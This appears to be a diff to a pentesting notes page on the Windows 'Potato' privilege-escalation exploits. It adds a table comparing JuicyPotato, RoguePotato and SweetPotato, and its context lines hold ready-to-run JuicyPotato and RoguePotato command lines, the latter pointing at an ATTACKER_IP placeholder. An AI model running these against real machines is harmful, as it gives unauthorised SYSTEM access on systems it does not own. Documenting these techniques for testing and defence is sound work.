@@ -13,7 +13,13 @@ The "Potato" family of local privilege escalation (LPE) exploits abuses the `SeI
 
 They force a high-privileged system service (typically running as `NT AUTHORITY\SYSTEM`) to authenticate to a rogue local listener over RPC, relay or intercept the authentication challenge, and impersonate the resulting access token to spawn a process as `SYSTEM`.
 
-#### JuicyPotato
+| **Exploit** | **Primary Vector**                         | **Target Environment**                    | **Key Bypass / Innovation**                                                |
+| ----------- | ------------------------------------------ | ----------------------------------------- | -------------------------------------------------------------------------- |
+| JuicyPotato | Local DCOM/OXID to 127.0.0.1               | Windows 7 to 10 (<1809), Server 2008–2016 | Expanded RottenPotato with CLSID brute-forcing.                            |
+| RoguePotato | Remote OXID Resolver + Fake RPC Pipe       | Windows 10 (1809+) & Server 2019+         | Bypasses local port restriction by routing OXID off-box or via forwarders. |
+| SweetPotato | Multi-engine (DCOM, PrintSpoofer, WlanSvc) | Windows 7 through Server 2019/2022        | Unified, self-contained suite auto-detecting viable pipe/DCOM vectors.     |
+
+## JuicyPotato
 
 {% embed url="https://github.com/ohpe/juicy-potato" %}
 
@@ -25,7 +31,7 @@ They force a high-privileged system service (typically running as `NT AUTHORITY\
 **#JuicyPotato with a .bat execution, a different CLSID, only the function CreateProcessWithTokenW used and a COM listener on 1337**\
 `./juicypotato.exe -l 1337 -t CreateProcessWithTokenW -p pathToBat -c {e60687f7-01a1-40aa-86ac-db1cbf673334}`
 
-#### RoguePotato
+## RoguePotato
 
 {% embed url="https://github.com/antonioCoco/RoguePotato" %}
 
@@ -37,7 +43,7 @@ They force a high-privileged system service (typically running as `NT AUTHORITY\
 **#On the target machine, as an account with impersonation privileges**\
 `.\RoguePotato.exe -r ATTACKER_IP -e "command" -l 9999`
 
-#### SweetPotato
+## SweetPotato
 
 {% embed url="https://github.com/CCob/SweetPotato" %}
 
